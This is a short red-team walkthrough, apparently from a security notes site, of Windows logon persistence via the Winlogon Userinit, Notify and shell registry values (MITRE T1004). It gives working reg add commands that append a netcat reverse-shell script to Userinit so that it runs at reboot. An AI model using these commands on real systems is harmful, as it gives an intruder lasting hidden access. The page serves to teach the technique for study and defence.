# Windows Logon Helper

> Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence \(SAS\) triggered by Ctrl-Alt-Delete.
>
> [https://attack.mitre.org/techniques/T1004/](https://attack.mitre.org/techniques/T1004/)

Commonly abused Winlogon registry keys and value for persistence are:

```text
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
```

{% hint style="info" %}
HKCU can also be replaced with HKLM for a system wide persistence, if you have admin privileges.
{% endhint %}

## Execution

Let's run through the techqnique abusing the `userinit` subkey.

Let's see what's currently held at the `userinit`:

```text
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
```

![](../../.gitbook/assets/image%20%2821%29.png)

Let's now add an additional item shell.cmd \(a simple reverse netcat shell\) to the list that we want to be launched when the compromised machine reboots:

```text
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
```

![](../../.gitbook/assets/image%20%28432%29.png)

Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:

![](../../.gitbook/assets/image%20%28345%29.png)

## References

{% embed url="https://attack.mitre.org/techniques/T1004/" %}

